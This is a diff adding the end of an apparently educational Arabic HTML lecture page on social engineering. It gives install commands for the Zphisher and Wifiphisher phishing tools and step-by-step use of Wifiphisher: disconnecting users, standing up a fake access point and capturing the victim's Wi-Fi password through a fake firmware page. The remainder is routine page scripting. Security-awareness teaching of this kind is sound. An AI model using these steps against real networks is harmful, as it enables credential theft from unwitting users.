+            
+            <div class="code-block">
+                # تثبيت Zphisher
+                sudo apt update
+                sudo apt install git curl php -y
+                git clone https://github.com/htr-tech/zphisher
+                cd zphisher
+                
+                # تشغيل الأداة
+                sudo ./zphisher.sh
+            </div>
+            
+            <h3 class="section-title">2. Wifiphisher</h3>
+            <p class="content-text">Wifiphisher هي أداة أمنية تقوم بأتمتة هجمات التصيد الاحتيالي ضد شبكات Wi-Fi. تهدف إلى الحصول على بيانات الاعتماد عن طريق خداع المستخدمين.</p>
+            
+            <h4 class="section-title">آلية عمل Wifiphisher:</h4>
+            <ul class="feature-list">
+                <li class="feature-item"><strong>قطع الاتصال:</strong> فصل جميع المستخدمين المتصلين بالشبكة المستهدفة</li>
+                <li class="feature-item"><strong>إنشاء نقطة وصول مزيفة:</strong> إنشاء شبكة Wi-Fi وهمية بنفس اسم الشبكة الأصلية</li>
+                <li class="feature-item"><strong>توجيه لصفحة تصيد:</strong> توجيه المستخدم إلى صفحة ويب مزيفة تشبه إعدادات الراوتر</li>
+                <li class="feature-item"><strong>الحصول على كلمة المرور:</strong> طلب كلمة المرور بحجة تحديث البرنامج الثابت</li>
+            </ul>
+            
+            <div class="code-block">
+                # تثبيت Wifiphisher
+                sudo apt update
+                sudo apt install wifiphisher
+                
+                # أو من المصدر
+                git clone https://github.com/wifiphisher/wifiphisher.git
+                cd wifiphisher
+                sudo python3 setup.py install
+                
+                # تشغيل الأداة
+                sudo wifiphisher
+            </div>
+            
+            <h4 class="section-title">كيفية الاستخدام:</h4>
+            <ul class="feature-list">
+                <li class="feature-item">تشغيل الأداة وانتظار مسح الشبكات</li>
+                <li class="feature-item">اختيار الشبكة المستهدفة من القائمة</li>
+                <li class="feature-item">اختيار سيناريو الهجوم (مثل Firmware Upgrade)</li>
+                <li class="feature-item">بدء الهجوم وانتظار إدخال الضحية لكلمة المرور</li>
+                <li class="feature-item">عرض كلمة المرور في نافذة الطرفية عند إدخالها</li>
+            </ul>
+            
+            <div class="warning-box">
+                <div class="warning-title">ملاحظة هامة</div>
+                <p>الهندسة الاجتماعية هي أخطر أنواع الهجمات لأنها تستهدف العنصر البشري، والذي غالباً ما يكون أضعف حلقة في سلسلة الأمان. التوعية الأمنية هي أفضل دفاع ضد هذه الهجمات.</p>
+            </div>
+        </section>
+    </main>
+    
+    <script>
+        // Loading Screen
+        window.addEventListener('load', function() {
+            const loading = document.getElementById('loading');
+            setTimeout(() => {
+                loading.classList.add('hidden');
+            }, 1000);
+        });
+        
+        // Smooth Scrolling for Navigation Links
+        document.querySelectorAll('.nav-link').forEach(link => {
+            link.addEventListener('click', function(e) {
+                e.preventDefault();
+                const targetId = this.getAttribute('href');
+                const targetElement = document.querySelector(targetId);
+                if (targetElement) {
+                    targetElement.scrollIntoView({
+                        behavior: 'smooth',
+                        block: 'start'
+                    });
+                }
+            });
+        });
+        
+        // Intersection Observer for Animations
+        const observerOptions = {
+            threshold: 0.1,
+            rootMargin: '0px 0px -50px 0px'
+        };
+        
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    entry.target.style.opacity = '1';
+                    entry.target.style.transform = 'translateY(0)';
+                }
+            });
+        }, observerOptions);
+        
+        // Observe lecture cards
+        document.querySelectorAll('.lecture-card').forEach(card => {
+            card.style.opacity = '0';
+            card.style.transform = 'translateY(50px)';
+            card.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
+            observer.observe(card);
+        });
+        
+        // Navigation highlight on scroll
+        window.addEventListener('scroll', () => {
+            const sections = document.querySelectorAll('.lecture-card');
+            const navLinks = document.querySelectorAll('.nav-link');
+            
+            let current = '';
+            sections.forEach(section => {
+                const sectionTop = section.offsetTop;
+                const sectionHeight = section.clientHeight;
+                if (scrollY >= (sectionTop - 200)) {
+                    current = section.getAttribute('id');
+                }
+            });
+            
+            navLinks.forEach(link => {
+                link.classList.remove('active');
+                if (link.getAttribute('href') === '#' + current) {
+                    link.classList.add('active');
+                }
+            });
+        });
+        
+        // Add active class styling
+        const style = document.createElement('style');
+        style.textContent = `
+            .nav-link.active {
+                background: var(--gradient-primary);
+                color: var(--bg-dark);
+                transform: translateY(-2px);
+                box-shadow: var(--shadow-glow);
+            }
+            .nav-link.active::before {
+                left: 0;
+            }
+        `;
+        document.head.appendChild(style);
+        
+        // Parallax effect for background
+        window.addEventListener('scroll', () => {
+            const scrolled = window.pageYOffset;
+            const parallax = document.querySelector('.bg-animation');
+            const speed = scrolled * 0.5;
+            parallax.style.transform = `translateY(${speed}px)`;
+        });
+        
+        // Code block copy functionality
+        document.querySelectorAll('.code-block').forEach(block => {
+            block.style.position = 'relative';
+            const copyBtn = document.createElement('button');
+            copyBtn.innerHTML = '📋';
+            copyBtn.style.cssText = `
+                position: absolute;
+                top: 10px;
+                left: 10px;
+                background: var(--accent-color);
+                border: none;
+                border-radius: 5px;
+                padding: 5px 10px;
+                cursor: pointer;
+                font-size: 14px;
+                opacity: 0.7;
+                transition: opacity 0.3s ease;
+            `;
+            copyBtn.addEventListener('click', () => {
+                navigator.clipboard.writeText(block.textContent);
+                copyBtn.innerHTML = '✅';
+                setTimeout(() => copyBtn.innerHTML = '📋', 2000);
+            });
+            copyBtn.addEventListener('mouseenter', () => copyBtn.style.opacity = '1');
+            copyBtn.addEventListener('mouseleave', () => copyBtn.style.opacity = '0.7');
+            block.appendChild(copyBtn);
+        });
+    </script>
+</body>
+</html>
+
